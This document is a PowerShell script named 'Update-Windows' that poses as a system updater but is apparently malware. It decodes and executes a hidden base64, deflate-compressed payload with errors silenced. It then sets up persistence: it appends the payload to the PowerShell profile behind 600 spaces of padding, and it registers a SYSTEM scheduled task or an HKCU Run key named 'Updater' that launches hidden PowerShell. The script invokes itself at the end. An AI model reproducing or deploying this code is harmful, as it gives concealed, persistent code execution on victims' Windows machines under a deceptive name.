function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('tVb5j9o4FP55KvV/iCokEpUhXO0cUqXNwTUDDBAIV9HKkzjBYOJM4nB1+7/vCyQdRp3Z7e5qI1Bsv8PP3/ueX5zIszhhnrBb9ca03hS+vX930UUBWgtihv8+KtdzQgZPecnaSBcXIMv4+Aav9M3VoncQvgjiTPF9na0R8ea3t1oUBNjjp3m+jrkShnj9SAkORUn4QxgtcIAvHx6X2OLCNyHze75O2SOiidpeQ9YCC5eKZ8eyFrNQHFve8CnhYvbr16w0uyzO89WnCNFQzBr7kON13qY0KwnfpXjDwd7HYrZNrICFzOH5EfHKpfzQC5GDO+Btg9uYL5gdZiU4DPwCzKPAE86PFfs5aYlZGHYDZim2HeAQjPJNb8NWWMx4EaU54TdxlgTRjzxO1hjkHAfMN3CwIRYO8w3k2RT3sTMXO3ibnv1XjcRzI9Dq8kDKQWbejrbN7Ijik4Os9HO8p6RK8DwnFqD4/v7d+3dOSgZ/6JwTAUYXs+MYQ5xil4XkqPZFKOSENmyFOAv2MM0MgghLc2EWp2E2nwsZxzX77mo87o94lHvbTzE1AhO8xOhqaMHqzGTEnoNVkquMfx2Zg+0kFr1NOx07xMP63kNrYqXMEl9DHzsUHw+cT9U6EJqYTQTY1jHFLuIxkDlh9rNZdU34D1s1ItTGgWJBBkOICpIrvQzmlBsx2/TaeA2IneZZSIQDfMapdsLhfbp7PAelrEZRGOaEbgQFZeUEAyOK7ZygeCFJRErE2XGYfQ63HVFOLBTy1N1cOoMy2VJjXsiDyII8wvEHho8tgmiMRk5oEBure4O46dbZV7HQEKXEc8HTBnIBKzEGBo/ZEdi5l0yQ8gbmzbVP8Rp0j0Veo8iFkk4q4kgr5GI7+0qwKdtP1I6RSSE5CxXSbVDGc4JJAg7XRYxywqz/Fsz5nZGEpQU4SZOYltJM3fO4AjJWW6m09JixCWRHgAIO4NQCtlZRiD9XDB4AdOIH+YFoCjyTpkfblroiRWVLis02/Iek3GT6lX1/t2zIgb5bOEozbLYbXb3XaFQ2d4ZZ4Ua1ye+7Td6ujpdLQ2n0hxM+bSqNASmsJpWDf0cORkuxJzv580E9bAvq7rB0bWeiO4575Rj94qcaaY20nloooZZejVojdasWKmGVbBs9Muyt7mr8cWJSNHRkd1y8QWTXCpZmkbUPTUWpL8rW4c4x64u2vZ805JtRZaVUFUXzqmZNZfcTNVC6solckwVqtNdKrqboi5DgaW9YU3u9mqoM68sn/UZ2wXaMFurILJGpP+4vYF6DEO7lQqVp4wOb9ACkOlOQ2wcdVytZCwd09I+K+rHDwhJaqUxRQac2fYK4Jn6tS0E+GJaYYtLOGCmt6b4my8VJt6I0CmRUd5XYJXLVHlLCjX7Q5aJpM3v0qTNxZHNMr2RdG/iWI8vytqHfW9Pi7vrhqqIWnrQ1WdPHki3fDK9Vb3vvdjeu3Rtd9Xed/SPsN5Rl80NMHGBOho+mmrfwB53hcHXGibf6QBsF4QJR4Arc7Gn91lhQSy7qLiOxhSim3XuFAw9T6HjQE1PmK5QyK+4a8a0ODevURuZQxEMYlkuvjiThh6L03EXSpdvbKcQJdXRid76FPZcvcoVduVCAllDYVQpw4l8/ncb8vZg4y8VN5QVQz/vQ4z5SXGCZzU3p8Zob7fL/jmNS3gt42X+D4/PaX0h/CdtC7iUGP4lfLvwjuP8NCCNEOCgbcE9RfOqjr2KR0Ofsy+NHooAfTvLEH4MPEb/swFfJnw=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 20:15:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist